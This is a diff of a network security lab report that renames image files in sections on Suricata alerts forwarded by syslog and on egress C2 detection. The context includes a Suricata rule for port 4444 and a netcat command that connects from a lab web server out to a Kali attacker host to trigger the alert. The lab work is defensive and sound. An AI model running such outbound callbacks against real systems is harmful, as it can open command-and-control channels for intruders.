@@ -190,14 +190,14 @@ alert tcp any any -> any 4444 (msg:"CANH BAO NGUY HIEM: Phat hien ket noi ra C2 
 * pfSense forwards Suricata alerts by syslog (UDP 514) to WEB2 (`10.10.200.12`) in the DMZ, along with EVE JSON (flow ID, addresses and ports, HTTP metadata, payload).
 * This is a simulation of a central log server. WEB2 sits in the same DMZ as WEB1 and UDP syslog is neither authenticated nor encrypted, so it does not provide tamper resistance.
 
-![Figure 6.2: Syslog on WEB2 for the injection alert](./images/p2_26_syslog_rce.png)
+![Figure 6.2: Syslog on WEB2 for the injection alert](./images/syslog_rce.png)
 
 ### 6.3 Egress C2 detection
 
 * WEB1 connects out to Kali on TCP 4444: `echo "connect-to-c2" | nc -w 1 203.0.113.6 4444`.
 * The traffic is source-NATed to `198.51.100.2` on WAN1. Suricata on WAN1 therefore sees the translated source address, and the alert (SID 9000030) reached WEB2.
 
-![Figure 6.3: Egress C2 alert in syslog](./images/p2_27_syslog_c2.png)
+![Figure 6.3: Egress C2 alert in syslog](./images/syslog_c2.png)
 
 ---
 
